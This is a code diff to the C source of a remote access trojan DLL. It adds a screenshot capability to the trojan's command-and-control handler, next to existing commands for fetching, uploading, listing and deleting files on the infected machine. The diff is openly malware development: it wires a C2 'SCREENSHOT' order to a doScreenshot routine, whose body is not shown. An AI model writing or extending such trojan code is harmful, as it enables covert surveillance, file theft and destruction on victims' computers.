@@ -7,6 +7,7 @@
 #include "RAT-Dll-PutFile.h"
 #include "RAT-Dll-DirList.h"
 #include "RAT-Dll-DeleteFile.h"
+#include "RAT-Dll-Screenshot.h"
 
 
 /** This function will serve as our main 'handler' for C2 requests
@@ -217,7 +218,6 @@ INT startListen()
                      if (status != SUCCESS)
                      {
                          // Send back failure here as well 
-
                          sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performGetFile %d\n", status);
                          OutputDebugStringA(msgBuf);
                          goto cleanup;
@@ -348,7 +348,13 @@ INT startListen()
             // C2 says to take a screenshot 
             else if (strcmp((const char*)&recvBuf, SCREENSHOT) == 0)
             {
-                
+                status = doScreenshot();
+                if (status != SUCCESS)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from doScreenshot %d\n", status);
+                    OutputDebugStringA(msgBuf);
+                    goto cleanup;
+                }
 
             }
         }
